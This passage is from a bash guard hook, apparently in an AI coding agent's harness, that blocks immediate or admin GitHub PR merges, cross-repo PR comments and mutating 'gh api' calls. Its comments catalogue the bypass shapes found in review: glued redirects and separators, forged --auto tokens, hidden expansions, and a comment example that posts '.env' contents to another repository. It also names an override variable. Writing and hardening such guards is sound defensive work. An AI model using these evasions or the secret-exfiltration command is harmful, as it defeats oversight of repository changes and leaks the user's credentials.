  # 2): that completeness claim was also false — GH_API_CLAUSE, the gh-api
  # CLAUSE-CUT gating the same mutating-HTTP-method check a few lines below
  # GH_API_RE, kept a hardcoded literal space and was missed by this
  # widening (a detector widened without its sibling consumer — the same
  # class
  # docs/solutions/logic-errors/occurrence-ambiguity-guard-applied-selectively-not-uniformly-2026-08-17.md
  # already documents). Now fixed at that assignment (search this file for
  # `GH_API_CLAUSE=`); regression tests in test-guard-outward-cli.sh's
  # "2026-09-02 FIX (round 2)" block.
  # Two-sided regression test: test-guard-outward-cli.sh's "2026-09-02 FIX"
  # block (RED against the pre-fix suffix, GREEN after; a negative control
  # pins that a DIFFERENT, unrelated read-only verb glued the same no-comma
  # way still allows — that control tests verb identity, not the
  # comma/no-comma split, which the code does not preserve).
  #
  # Widening a single-character suffix alternation cannot shorten this
  # CLAUSE: the trailing `[^;&|]*` capture below is a SEPARATE class,
  # untouched by what `_OUT_POS_SUFFIX` itself matches, so this fix can only
  # ever ADD matches (extend which 'gh pr merge' SHAPES this pattern
  # recognizes at all), never truncate an already-matched clause —
  # differentially tested 2026-09-02 across 9 constructed shapes, no
  # truncation in any of them. This directly answers a PR #874
  # security-auditor finding, carried forward unverified by a prior version
  # of this comment (per the todo that corrected it:
  # todos/archive/P3-2026-08-28-cmd-pos-anchor-widening-stale-comments.md),
  # that widening this suffix would TRUNCATE the CLAUSE before a real --auto
  # is reached — that specific mechanism could not be reproduced and is
  # understood to be structurally impossible for this pattern shape, which is
  # exactly what makes this fix safe. See
  # docs/solutions/logic-errors/cmd-position-anchor-missed-brace-backtick-bang-boundaries-2026-08-28.md's
  # Prevention section for the broader "two anchors that widened together are
  # not automatically the same anchor" rule this residual disagreement is one
  # instance of.
  #
  #   `<`/`>` are REAL bash redirect operators and DO split a glued verb into
  #   its own word (verified: a verb glued to a redirect word-splits exactly
  #   like the spaced form). Their absence from `_OUT_POS_SUFFIX` WAS a LIVE
  #   bypass of this hook, not a cosmetic gap — confirmed directly: a
  #   redirect glued onto 'gh pr merge' was SILENTLY ALLOWED here where the
  #   spaced/bare form correctly denied.
  #
  #   STRENGTHENED 2026-09-02 (round 3): re-verified against THIS clause
  #   specifically, and the severity was worse than "silently allowed where
  #   the spaced form denies" states — it was a TOTAL detection failure, not
  #   merely a clause-capture issue. `gh pr merge>log` (no `--auto` at all,
  #   no decoy, nothing to find) was silently ALLOWED, because `>` right
  #   after `merge` made GH_MERGE_RE itself fail to match — the whole `gh
  #   pr merge` check block never ran, CLAUSE was never even computed. This
  #   was a DIFFERENT root cause from the round-3 swallowing-clause fix just
  #   below (that one computed a wrong CLAUSE from a valid match; this one
  #   never got a match at all).
  #
  #   FIXED 2026-09-05 (outward-CLI-guard-folded-repair, finding A):
  #   `_OUT_POS_SUFFIX` now includes `<`/`>` in its closer alternation, so
  #   GH_MERGE_RE now matches `gh pr merge>log` at all. `_OUT_POS_SUFFIX_MERGE_CLAUSE`'s
  #   branch 2 (the positive closer class) also carries `<`/`>`, so the
  #   CLAUSE cut recognizes the `>` right after `merge` as a valid closer
  #   too (branch 1, the negated clause-cut class, never engages for this
  #   bare shape — the character right after `merge` is `>`, not a space,
  #   so branch 1's space-anchored alternative does not apply here at all).
  #   `gh pr merge>log` (bare, no decoy) now DENIES; regression tests in
  #   test-guard-outward-cli.sh's "2026-09-05: finding A" block.
  #   ROUND 2 (2026-09-05, same repair, after a CRITICAL security review):
  #   branch 1's OWN `<`/`>` addition — a SEPARATE change from the two
  #   above, needed only for a DIFFERENT shape (`gh pr merge 42
  #   --auto>/dev/null`, a redirect glued to a LATER flag inside the
  #   clause, not to the verb itself) — was REVERTED after it was found to
  #   also truncate the CLAUSE ahead of a later `$`-bearing sigil
  #   (`gh pr merge 42 --auto >anyfile ${x:---admin}`), hiding the `$` from
  #   the unverifiability guard just below and silently allowing a real
  #   administrator-override merge. See the ACCEPTED OVER-DENIAL residual
  #   in the COMMAND-POSITION ANCHORS header above for the full account;
  #   branch 1 is narrow again as of ROUND 2 and this bare-shape fix
  #   (which never depended on branch 1) is unaffected.
  #   The `_OUT_POS_PREFIX` leading-redirect gap noted in the
  #   COMMAND-POSITION ANCHORS header above was a SEPARATE mechanism (this fix
  #   only closed the trailing/suffix side) — FIXED SEPARATELY 2026-09-05
  #   (outward-CLI-guard-folded-repair, finding B; see the DOCUMENTED
  #   RESIDUALS section's "leading:" bullet for the full account, including a
  #   new accepted over-denial that fix introduces: a leading redirect that
  #   itself carries a `$` now also trips this file's `printf '%s' "$CLAUSE"
  #   | grep -qF '$'` unverifiability check, because the absorbed prefix is
  #   part of this CLAUSE capture).
  #
  # FIXED 2026-09-02 (round 3, PR #910 post-merge review): this used to read
  # `${_OUT_POS_SUFFIX}[^;&|]*` — a SWALLOWING pattern that consumes the
  # boundary character and keeps capturing past it regardless of what that
  # boundary was. That is correct when the boundary is whitespace (more of
  # the SAME clause follows), but when `merge` is glued DIRECTLY to a hard
  # separator with no argument in between — `gh pr merge;curl --auto`,
  # `gh pr merge&curl --auto`, `gh pr merge|curl --auto`, `$(gh pr
  # merge)curl --auto` (a close-paren closing the `$(...)` the verb sits
  # inside) — the suffix consumed the separator itself and
  # `[^;&|]*` then captured straight into the UNRELATED following command,
  # picking up its `--auto` as a DECOY. Because this is the ONE
  # `_OUT_POS_SUFFIX`-family clause-cut whose downstream check decides an
  # ALLOW on flag presence (every sibling — `GH_API_CLAUSE`,
  # `gh_pr_clause_has_repo` — DENIES on presence, so their over-capture can
  # only ever ADD a deny), this was a working FALSE ALLOW of an immediate,
  # non-automerge `gh pr merge` — exactly what this check exists to block.
  # Confirmed silently ALLOWED before this fix for all four forms above —
  # three glued hard separators plus the `$(...)` close-paren, a
  # structurally different construct sharing only the boundary CHARACTER
  # class, not the "two commands glued together" mechanism (construct-and-
  # run, not regex-reading); confirmed a real,
  # sanctioned `gh pr merge 42 --auto` still allows and `gh pr merge
  # 42;curl --auto` (an arg token between verb and separator) still
  # correctly denied both before and after — that shape was never affected.
  # Fixed with `_OUT_POS_SUFFIX_MERGE_CLAUSE` (defined next to
  # `_OUT_POS_SUFFIX` above): captures further clause text ONLY after a
  # whitespace boundary; a hard separator/bracket or end-of-string ends the
  # clause immediately with nothing captured past it. Two-sided regression
  # test: test-guard-outward-cli.sh's "2026-09-02 FIX (round 3)" block.
  CLAUSE=$(printf '%s' "$WORDS" | grep -oiE "${_OUT_POS_PREFIX}gh[[:space:]]+pr[[:space:]]+merge${_OUT_POS_SUFFIX_MERGE_CLAUSE}" | head -1)
  # A naive "--auto present" substring check is bypassable: several of `gh pr
  # merge`'s own flags (and the cross-subcommand --repo/-R every gh command
  # accepts) are VALUE-TAKING, so the token immediately after one of them is
  # consumed as its VALUE, not read as a separate flag — `gh pr merge 42
  # --body --auto` merges IMMEDIATELY, with "--auto" as the commit body text;
  # gh never sees a real --auto flag. Reuse the exact value-flag set
  # lib/cmd-detect.sh's own cmd_gh_pr_ref already established for this
  # subcommand family (derived against `gh pr merge|close|edit --help`,
  # deliberately kept as the FULL merge|close|edit union rather than a
  # merge-only subset — over-inclusion here only tightens the check, it
  # cannot create a bypass) and reject an --auto match whose PRECEDING
  # token is one of them.
  GH_MERGE_VALUE_FLAGS='^(--author-email|--body-file|--body|--match-head-commit|--subject|--comment|--add-assignee|--add-label|--add-project|--add-reviewer|--base|--milestone|--remove-assignee|--remove-label|--remove-project|--remove-reviewer|--title|--repo|-A|-b|-F|-t|-c|-B|-R)$'
  # CLAUSE's "one quoted span = one word" invariant — the premise the --auto
  # scan below depends on — is FALSE when a quoted VALUE contains its own
  # internal quoting: `-b "$(printf %s "AAA "--auto" BBB")"` renders (via
  # unmodified cmd_words, which tracks quote state as ONE flat toggle with no
  # concept that $(...) opens an independent quoting namespace in real bash)
  # as `-b $xprintfx%sxAAA --auto BBBx` — the internal `"..."` pairs flip that
  # flat toggle back to "unquoted" mid-span, so the literal spaces around
  # --auto survive as REAL word boundaries, manufacturing a free-standing
  # --auto token that is NOT a real argv word (confirmed: `gh(){ for a in
  # "$@"; do echo "[$a]"; done; }` on the identical string shows the whole
  # thing as ONE argv element, "AAA --auto BBB", with no standalone --auto —
  # bug found by security review, 2026-09-02). Detecting the general case
  # exactly is out of scope for this fix (it needs cmd_words itself to become
  # nesting-aware, a materially larger change than this todo's Scope
  # Contract's narrow substitution-liveness fix) — so, matching this whole
  # check's existing "cannot verify -> deny" default, ANY literal `$`
  # surviving in CLAUSE (a legitimate `"$MESSAGE"` variable reference renders
  # the identical way, since cmd_words never touches a bare `$` either) makes
  # --auto unverifiable and denies, rather than trusting a token boundary that
  # may not correspond to a real one. Over-broad in the safe direction: a
  # real, uncorrupted --auto with a co-occurring unrelated $VAR mention
  # elsewhere in the same clause now also denies, in exchange for closing the
  # forged-token bypass. Pinned in test-guard-outward-cli.sh.
  if printf '%s' "$CLAUSE" | grep -qF '$'; then
    HAS_REAL_AUTO=no
  else
    HAS_REAL_AUTO=$(awk -v flags="$GH_MERGE_VALUE_FLAGS" '
      { prev = ""
        for (i = 1; i <= NF; i++) {
          if ($i == "--auto" && prev !~ flags) { print "yes"; exit }
          prev = $i
        }
      }' <<< "$CLAUSE")
  fi
  if [ "$HAS_REAL_AUTO" != "yes" ]; then
    deny "guard-outward-cli: command-position 'gh pr merge' without a REAL --auto flag merges a PR immediately. A '--auto' token consumed as the VALUE of a preceding value-taking flag (--body/-b, --body-file/-F, --subject/-t, --author-email/-A, --match-head-commit/-c, --repo/-R, ...) does not count as --auto. 'gh pr merge --auto ...' (this repo's sanctioned /todo automerge mechanism) stays allowed — branch protection still gates the actual merge. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
  fi
  # --admin ("use administrator privileges to merge a PR that does not meet
  # requirements") contradicts the --auto carve-out's own premise (that branch
  # protection still gates the merge) — deny regardless of --auto. A
  # false-positive deny here (--admin appearing only as some OTHER flag's
  # value, or mentioned in an unrelated clause) is the safe direction, so no
  # value-flag predecessor check or clause-scoping is needed the way --auto's
  # decoy check above needs one: this check can only ever ADD a deny, never
  # grant a carve-out. DELIBERATELY avoids $BARE/$CLAUSE (see below for which
  # renderings it scans instead): `--admin` is a genuine, functioning argv
  # token whether or not the shell quoted it (quotes affect word-splitting,
  # not what gh actually receives —
  # `gh pr merge 42 --auto "--admin"` passes the literal string `--admin`,
  # identically to the unquoted form), so relying on cmd_bare here — which
  # deliberately blanks quoted CONTENT to avoid false-positiving on a quoted
  # MENTION elsewhere in this hook — would make a quoted --admin invisible
  # and silently grant the very carve-out this check exists to deny (found in
  # review round 2: `gh pr merge 42 --auto "--admin"` and
  # `gh pr merge 42 --auto --admin=true` both slipped past a $CLAUSE-based
  # whitespace-only check). The boundary class is "not a word/dash character"
  # rather than strictly whitespace, so it also catches `--admin=true`,
  # `--admin=1`, and a trailing quote/comma/etc.
  # Flag scan via scan_both — see its definition for why both renderings are read
  # and why they must stay newline-joined (this check is the seam example there).
  # Leading boundary is `_OUT_FLAG_LEAD` (see its own definition) so a
  # default-value expansion (`${x:---admin}`) cannot donate the flag's
  # boundary. NOT independently regression-tested on this family: ANY literal
  # `$` surviving in CLAUSE already denies earlier, at the "without a REAL
  # --auto flag" check (documented at that check's own CLAUSE= assignment),
  # before this line ever runs — a `${x:---admin}` assertion here would pass
  # on the unfixed tree too and pin nothing. Applied anyway, for the same
  # reason the other two sites are: leaving one of three copies of a widened
  # detector unfixed is this file's own documented recurring defect.
  if scan_both "${_OUT_FLAG_LEAD}"'--admin([^-A-Za-z0-9]|$)'; then
    deny "guard-outward-cli: command-position 'gh pr merge --admin' uses administrator privileges to merge a PR that may not meet requirements — this contradicts the --auto carve-out's premise (branch protection gating). Denying regardless of --auto. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
  fi
fi

# --- gh: other mutating subcommands (pr create/comment allowed only without
#     --repo/-R, see the header) -------------------------------------------
GH_MUTATING_RE="${_OUT_POS_PREFIX}gh[[:space:]]+(pr[[:space:]]+(close|edit|ready|reopen|review|lock|unlock|update-branch|revert)|release[[:space:]]+(create|delete|delete-asset|edit|upload)|repo[[:space:]]+(create|delete|archive|unarchive|edit|rename|sync|fork))${_OUT_POS_SUFFIX}"
if grep -Eqi "$GH_MUTATING_RE" <<< "$WORDS_DEEP"; then
  deny "guard-outward-cli: command-position mutating 'gh pr/release/repo' subcommand. Read-only forms (gh pr view/checks/list, gh release view/list, gh repo view/list, ...) are unaffected; gh pr create/comment are deliberately allowed (routine PR workflow) unless retargeted with --repo/-R. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
fi

# --- gh pr create/comment: routine carve-out, but NOT at another repo --------
# `--repo`/`-R` turns the routine carve-out into unbounded egress to an
# arbitrary GitHub repository with the user's PAT (`gh pr comment --repo
# other/org --body "$(cat .env)"` was ALLOWED, review round 3). Same treatment
# lib/cmd-detect.sh:242 already gives the flag, and this repo's own PR flow
# never passes it. Clause-scoped $WORDS_DEEP flag scan — see gh_pr_clause_has_repo.
#
# COUNTED, matching the gh pr merge treatment above (review round 4,
# 2026-08-17): gh_pr_clause_has_repo's `head -1` only ever inspects the FIRST
# create/comment clause, and unlike `merge` this family had no occurrence-
# count backstop of its own — a benign first clause let a malicious second
# clause's --repo/-R sail through unexamined (`gh pr create --fill && gh pr
# create --repo other/org --title x` was ALLOWED). Deny outright on >1
# occurrence rather than guess which clause to inspect.
GH_PR_CREATE_RE="${_OUT_POS_PREFIX}gh[[:space:]]+pr[[:space:]]+(create|comment)${_OUT_POS_SUFFIX}"
GH_PR_CREATE_OCCURRENCES=$(printf '%s' "$WORDS_DEEP" | grep -oiE "$GH_PR_CREATE_RE" | wc -l | tr -d '[:space:]')
if [ "${GH_PR_CREATE_OCCURRENCES:-0}" -gt 1 ]; then
  deny "guard-outward-cli: more than one command-position 'gh pr create/comment' occurrence — ambiguous, cannot verify each is free of --repo/-R. Denying is the safe direction for a deny gate. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
elif [ "${GH_PR_CREATE_OCCURRENCES:-0}" -eq 1 ] && gh_pr_clause_has_repo 'create|comment'; then
  deny "guard-outward-cli: 'gh pr create/comment' with --repo/-R writes to a DIFFERENT GitHub repository with the user's PAT — unbounded egress, outside the routine-workflow carve-out these two subcommands get. Without --repo/-R they stay allowed. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
fi

# --- gh api: mutating HTTP method -------------------------------------------
# `gh api` can invoke an ARBITRARY GitHub REST mutation, including the exact
# PR-merge action the dedicated clause above gates, via a different
# subcommand (`gh api -X PUT repos/.../pulls/42/merge`). Key the deny on the
# HTTP method, not the subcommand: this repo has legitimate READ-ONLY `gh
# api` usage (scripts/todo-automerge-guard.sh, .claude/skills/land/SKILL.md —
# both GET, gh api's own default with no -X/--method), which a blanket `gh
# api` deny would break.
# NOTE: this block reads $WORDS_DEEP throughout — occurrence count AND clause
# cut. It used to read $BARE, where a QUOTED method value (`gh api -X "POST"
# …`) was invisible because cmd_bare blanks quoted CONTENT; that was a
# documented residual and is now closed, since $WORDS_DEEP has already dropped
# the quote characters. Do NOT "fix" this by scanning raw $CMD: that was tried
# and it loses BOTH the command-position anchor and the separator
# neutralisation with it, so `echo "gh api docs" && gh api -X POST …` cut its
# clause from the decoy and `-f 'title=a|b'` truncated the clause at a quoted
# pipe — each an ALLOW on a production merge.
# DEEP, not shallow ($WORDS), is required here (unlike the `gh pr merge --auto`
# CLAUSE above): this block ALLOWS by default and only denies on affirmative
# evidence of a mutating method, so an EMPTY clause would silently ALLOW — the
# opposite failure mode from the merge block's "empty clause denies" shape. A
# `gh api -X POST …` hidden inside a live command substitution would have an
# empty clause on plain $WORDS and slip through undenied unless the clause
# cut, not just the occurrence count, also reads the deep union. Safe to
# widen regardless: this method scan is pure DENY-shaped (no flag here GRANTS
# anything), so it carries none of the grant-shaped hazard the CLAUSE comment
# above documents.
# More than one command-position `gh api` occurrence is ambiguous — the
# ORIGINAL round-2 version used `head -1` and silently ignored every
# occurrence after the first, which let a read-only first call shadow a
# mutating second one (`gh api repos/x/y && gh api -X PUT .../merge` was
# ALLOWED). Deny on >1, mirroring the identical multi-occurrence safe
# direction the `gh pr merge` check above already takes.
GH_API_RE="${_OUT_POS_PREFIX}gh[[:space:]]+api${_OUT_POS_SUFFIX}"
# Counted AND clause-scoped on $WORDS_DEEP (unlike the `gh pr merge` block
# above, whose CLAUSE stays shallow — see that block's own comment for why).
# This check ALLOWS by default (a read-only `gh api` is fine) and only denies
# once it reads a mutating method out of the clause, so a quoted command word
# (`gh "api" -X PUT …`) invisible to the rendering would fall through to ALLOW.
# Reading $WORDS_DEEP makes the quoted spellings AND a live-substitution-hidden
# occurrence visible, without resorting to raw $CMD, which would lose the
# command-position anchor and the separator neutralisation with it.
GH_API_OCCURRENCES=$(printf '%s' "$WORDS_DEEP" | grep -oiE "$GH_API_RE" | wc -l | tr -d '[:space:]')
if [ "${GH_API_OCCURRENCES:-0}" -gt 1 ]; then
  deny "guard-outward-cli: more than one command-position 'gh api' occurrence — ambiguous, cannot verify each is read-only. Denying is the safe direction for a deny gate. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
elif [ "${GH_API_OCCURRENCES:-0}" -eq 1 ]; then
  # Cut from $WORDS_DEEP, keeping the command-position ANCHOR and the
  # `[^;&|]*` clause bound. $WORDS_DEEP is what makes the quoted-flag-value
  # spellings visible WITHOUT resorting to raw $CMD: the quote characters are
  # already gone, so
  # `-X "PUT"` reads as `-X PUT` and `-X"PUT"` as `-XPUT`, both matched by the
  # existing pattern. An earlier revision scanned raw $CMD instead and lost both
  # the anchor and the separator-neutralisation with it — `echo "gh api docs" &&
  # gh api -X POST …` cut its clause from the decoy inside the echo, and
  # `-f 'title=a|b'` truncated the clause at a quoted pipe. Both ALLOWED a
  # production merge. Raw text is the right source for a flag check only when
  # the clause boundary does not also come from it (cf. the --admin check
  # below, which needs no clause).
  #
  # FIXED 2026-09-02 (round 2): this used to hardcode a literal
  # `[[:space:]]` after `api` instead of `${_OUT_POS_SUFFIX}`, unlike
  # GH_API_RE just above (the occurrence counter for this SAME check), which
  # was correctly migrated when `_OUT_POS_SUFFIX` gained `{`/`}` closers
  # (round 1, see the `gh pr merge` CLAUSE= comment above for the full
  # `{`/`}` story). Consequence: a comma-brace-glued `gh api{,x} -X POST
  # ...` counted as exactly one occurrence (GH_API_RE matched, using the
  # widened suffix) but this clause-cut then matched NOTHING (no literal
  # space after `api{,x}`), so $GH_API_CLAUSE was empty, the `-X`/`--method`
  # scan below short-circuited false, and the mutating-HTTP-method deny
  # never fired — SILENTLY ALLOWED before this fix (confirmed live, as was
  # the pre-existing backtick-glued form `gh api\`x\` -X POST ...`). Same
  # class as
  # docs/solutions/logic-errors/occurrence-ambiguity-guard-applied-selectively-not-uniformly-2026-08-17.md:
  # a detector widened without its sibling consumer. Two-sided regression
  # test: test-guard-outward-cli.sh's "2026-09-02 FIX (round 2)" block (RED
  # against the pre-fix literal-space clause regex, GREEN after).
  #
  # MERGE RESOLUTION 2026-09-03 (integration of PR #910 with PR #912): these
  # two PRs each changed THIS ONE LINE, on different axes, and neither side
  # alone is correct:
  #   - PR #912 changed the SOURCE `$WORDS` -> `$WORDS_DEEP` (deep
  #     substitution scan), which is what the unconflicted comment block
  #     immediately above already documents this cut as reading.
  #   - PR #910 changed the SUFFIX literal `[[:space:]]` -> `${_OUT_POS_SUFFIX}`
  #     (the round-2 fix described just above).
  # Taking PR #910's line verbatim would have silently reverted #912's deep
  # read while the comment above still claimed it; taking #912's line verbatim
  # would have silently reverted the `{`/`}` boundary fix and reopened the
  # confirmed-live `gh api{,x} -X POST` bypass. Both changes are kept. This is
  # safe for THIS clause specifically because it is DENY-shaped (over-capture
  # can only ever ADD a deny) — unlike the grant-shaped `gh pr merge` CLAUSE
  # above, which must stay on shallow `$WORDS` for the reason documented there.
  GH_API_CLAUSE=$(printf '%s' "$WORDS_DEEP" | grep -oiE "${_OUT_POS_PREFIX}gh[[:space:]]+api${_OUT_POS_SUFFIX}[^;&|]*" | head -1)
  # FIXED 2026-09-05 (C2): a method value that is not literal text (an
  # expansion or substitution, e.g. `-X ${x:-POST}`, `-X $METHOD`, `--method
  # $(printf PUT)`) never matches the literal POST/PUT/PATCH/DELETE text the
  # check below reads for, so it fell through UNDENIED. This block ALLOWS by
  # default (see the CLAUSE= comment above: an empty or unreadable clause is
  # the opposite failure mode from the `gh pr merge` CLAUSE, which DENIES by
  # default) — so an unreadable method must be its own EXPLICIT, unconditional
  # deny here, placed before the literal-value check ever runs, rather than an
  # extra alternative folded into that check's condition: a value that never
  # satisfies the literal match would otherwise still fall through to this
  # block's allow-by-default. Same "cannot verify -> deny" rule the `gh pr
  # merge` CLAUSE applies at its own `printf '%s' "$CLAUSE" | grep -qF '$'`
  # check above (this file's C1 neighbourhood) — ruled by the repository
  # owner, 2026-09-05: never evaluate the expansion to try to read its value;
  # unreadable means deny.
  #
  # NARROWED to co-occurrence with a method FLAG on purpose, not "any `$` or
  # backtick anywhere in GH_API_CLAUSE": a bare `$` in the clause is ordinary
  # and common with no method flag present at all — `gh api repos/$OWNER/$REPO`
  # (a dynamic route) and `gh api repos/o/r --jq '.[] | .name'` (a --jq
  # filter) are both routine read-only calls that must stay allowed. It is
  # the COMBINATION of "a method flag is present" and "something in this
  # clause is unreadable" that cannot be cleared: once a method flag exists,
  # its value is what decides whether the call mutates, and an unreadable
  # clause means that value cannot be confirmed literal.
  #
  # DESIGN CHOICE, accepted over-denial: the unreadability test below reads
  # the WHOLE clause, not just the -X/--method value's own token — matching
  # this file's existing `gh pr merge` CLAUSE precedent for the identical
  # shape (its own `printf '%s' "$CLAUSE" | grep -qF '$'` check, named a few
  # lines up in this same comment block). A real
  # `gh api repos/o/r -X GET -f note=$SOMETHING` (a literal GET, an unrelated
  # `$` elsewhere in the same clause) also denies
  # under this choice. Re-deriving the value's own token boundary a SECOND
  # time (glued -XPOST vs spaced -X POST vs `=`-joined --method=POST) in a
  # DIFFERENT regex than the literal-value check below already uses would
  # narrow this, but a boundary bug in that second derivation would silently
  # reopen exactly the gap this fix closes — and reasoning harder about the
  # expansion's shape is the mechanism the 2026-09-05 ruling forbids.
  # Measured against this repo's OWN `gh api` usage
  # (scripts/todo-automerge-guard.sh, .claude/skills/land/SKILL.md): neither
  # passes -X/--method at all, so this over-denial has no production surface
  # today. Checked against a false-positive corpus of read-only/benign gh api
  # idioms with no method flag at all — a bare read, --paginate, --jq, a -f
  # field on an explicit GET, a -H header — every one of which this
  # co-occurrence gate leaves untouched; pinned in test-guard-outward-cli.sh's
  # own "C2" assertion block.
  #
  # Flag detection stays case-SENSITIVE (`-X`, `--method`), matching the
  # policy the `_GH_API_M`-consuming mutating-method value check states for
  # itself (the `-x`/`- post` collision, review 2026-08-16) — a
  # case-insensitive `-x` would match the
  # alphanumeric placeholder cmd_words can insert for an unrelated quoted
  # value. A non-word trailing boundary (`[^-A-Za-z0-9]` or end-of-string)
  # after each flag spelling rejects an unrelated longer flag sharing the same
  # prefix (`--methodology`) while still admitting every real spelling this
  # check must catch: a space or `=` after either flag, and a glued `$`
  # immediately after `-X` (`-X${x:-POST}`, `-X$METHOD` — `$` is not in
  # `[A-Za-z0-9-]`, so the boundary is satisfied without a space).
  # FIXED 2026-09-05 (still C2, a second unreadable-value spelling found by
  # constructing the legacy command-substitution form): the `$` test alone
  # missed a backtick command substitution supplying the method
  # (`-X \`printf POST\``) — WORDS_DEEP keeps a NON-empty backtick pair's
  # literal text intact (unlike an EMPTY backtick pair, which vanishes and
  # fuses the surrounding text — that is what "mid-backtick" a few checks
  # above in this file exploits, a DIFFERENT mechanism), so no `$` character
  # is ever present and this check's own `$`-only test fell through UNDENIED.
  # Confirmed a live, silent ALLOW at HEAD 9c9ba75b (predates this task).
  # Same ruling as the `$` case: a backtick substitution is exactly as
  # unreadable as a `$` one, so it denies the same way — reading FOR a
  # second character class, not trying to read WHAT is inside either one.
  if grep -Eq '(^|[[:space:]])(-X|--method)([^-A-Za-z0-9]|$)' <<< "$GH_API_CLAUSE" \
     && printf '%s' "$GH_API_CLAUSE" | grep -qE '[$`]'; then
    deny "guard-outward-cli: command-position 'gh api' with a method flag (-X/--method) whose value is not literal text (an expansion or substitution) cannot be verified read-only — denying, the same 'cannot verify -> deny' rule the 'gh pr merge' --auto check applies. Read-only 'gh api' with no -X/--method is unaffected. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
  fi
  # Matches BOTH the spaced/`=` form (-X POST, -X=POST, --method POST,
  # --method=POST) AND the glued short-flag form (-XPOST — the common
  # curl-style spelling; found bypassing a separator-only pattern in review
  # round 2), case-insensitively.
  # The FLAG is matched case-SENSITIVELY (`-X`, `--method`) and only the VALUE
  # case-insensitively, per this file's stated flag-detection policy. A blanket
  # `grep -Eqi` made `-X` also match `-x`, which collides with the alphanumeric
  # placeholder cmd_words inserts: `gh api repos/o/r -f "- post"` rendered as
  # `-xpost` and falsely denied (review, 2026-08-16). `-X post` is a real
  # spelling, so the value must stay case-insensitive.
  _GH_API_M='([Pp][Oo][Ss][Tt]|[Pp][Uu][Tt]|[Pp][Aa][Tt][Cc][Hh]|[Dd][Ee][Ll][Ee][Tt][Ee])'
  # FIXED 2026-09-05 (found by this task's own mandated finding-A
  # co-occurrence test; distinct from the unreadable-method check on
  # GH_API_CLAUSE — the value here is fully literal, no `$`/backtick
  # involved): the trailing boundary after the method literal was hardcoded
  # to `([[:space:]]|$)`, so a literal method glued directly to a trailing
  # redirect — `gh api repos/o/r -X POST>/dev/null` — never matched: the
  # character right after "POST" is `>`, neither whitespace nor
  # end-of-string. Real bash still tokenizes "POST" as its own complete argv
  # word (a redirect operator terminates a word without needing whitespace);
  # gh genuinely receives `-X POST`. Confirmed a live, silent ALLOW at HEAD
  # 9c9ba75b (pre-Task-5). Reusing `${_OUT_POS_SUFFIX}` here (rather than
  # inventing a second closer class) is the same fix `GH_API_RE`'s own
  # `${_OUT_POS_SUFFIX}` already gives the VERB's own trailing boundary —
  # this hardcoded copy was simply never migrated to it. This is a
  # closer-position ASSERTION inside a boolean `grep -Eq`, not a CAPTURE
  # bound, so the round-2 CRITICAL (a wide capture-bounding branch 1
  # truncating a CLAUSE before a later `$`) does not apply here — nothing here
  # shortens what GH_API_CLAUSE itself captures. Safe to widen: this whole
  # check is DENY-shaped (see the GH_API_CLAUSE= assignment's own comment),
  # so a broader boundary can only ever ADD a deny. Two-sided regression
  # test: test-guard-outward-cli.sh's "CO-OCCURRENCE ... glued to a trailing
  # redirect (same regression guard, finding A axis)" row.
  if [ -n "$GH_API_CLAUSE" ] && grep -Eq "(^|[[:space:]])(-X${_GH_API_M}${_OUT_POS_SUFFIX}|(-X|--method)([[:space:]]+|=)${_GH_API_M}${_OUT_POS_SUFFIX})" <<< "$GH_API_CLAUSE"; then
    deny "guard-outward-cli: command-position 'gh api' with a mutating HTTP method (-X/--method POST/PUT/PATCH/DELETE, spaced/=/glued) can invoke an arbitrary GitHub REST mutation — including a PR merge via a different subcommand than the dedicated 'gh pr merge' check above. Read-only 'gh api' (GET, the default with no -X/--method) is unaffected. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
  fi
fi

exit 0
